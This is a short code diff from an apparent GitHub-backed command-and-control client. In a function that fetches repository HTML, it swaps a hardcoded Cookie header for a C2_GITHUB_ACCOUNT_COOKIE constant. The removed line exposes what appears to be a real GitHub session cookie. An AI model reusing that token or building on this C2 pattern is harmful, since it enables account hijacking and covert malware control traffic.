@@ -37,7 +37,7 @@ def fetchRepoHtml(host, path):
 
     headers = {
         'Accept': 'text/html, application/xhtml+xml',
-        'Cookie': '_octo=GH1.1.717973473.1686160875; _device_id=fd912b07fd6b39c2c9e43b6e5a036a8d; user_session=omTftv8RT_OgDgsP0GggEsqWHCM14Vbk25TgZeXwFu-WqftD; __Host-user_session_same_site=omTftv8RT_OgDgsP0GggEsqWHCM14Vbk25TgZeXwFu-WqftD; logged_in=yes; dotcom_user=gokupwn; has_recent_activity=1; color_mode={"color_mode":"dark","light_theme":{"name":"light","color_mode":"light"},"dark_theme":{"name":"dark","color_mode":"dark"}}; preferred_color_mode=dark; tz=Europe/Paris; _gh_sess=UVlRWxdcd4XsniyLzZBJc5Grh+HRNHqhmvVpIuSOPbngEJjvNIb23LIfkA4JqTTDqzejehutFPdDh6fn438eUoRpEejVrcg8dwkTCK8JPiF7TU1KLAtzqaDVoYsxgJjDHEZ%2FFcDCCK5eYyorqZLdBOvW2pD9Qka8chum7IYFZVBBlyOfbhMkIlOiRIP0y5N8et19Dz6CuPpqVguYF7WnAikvUFlpeqvyACI1z7pQTmIqXobZQl9NOhOCutOV6iiz1%2BHMfmviFD1cFOkJAr4dHdDBXEE%2FAPpGPKtx7veH9goYSTmO5EbtS8yRr9ZL%2FX69aaryRmYEN3JXxlkd6dqvQCV%2FUEQGnxzqFcQ%2B4mAn4R2QL2GmxK6UNCVZ9rIGZAhHnR8p7nw%2BM%2FuCOkS5fgiGYrJimW3MgNz72JnJu3aElzTjcmTAA%2F4MwuJn8M6Sc21utUIOlElMaH9CmNMkFdY0ip2chqKblIdF1aY2iSxUqdH2qUnsCpyjbP%2FCd49TEMDSdNg2evqCYP%2B8BMq6%2FGJbF9FSlUeK9%2F8pTzV2tEU2Fseq8YDS28Fy8g==',
+        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
         'X-Requested-With': 'XMLHttpRequest',
         'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
         'User-Agent': C2_CLIENT_USER_AGENT,
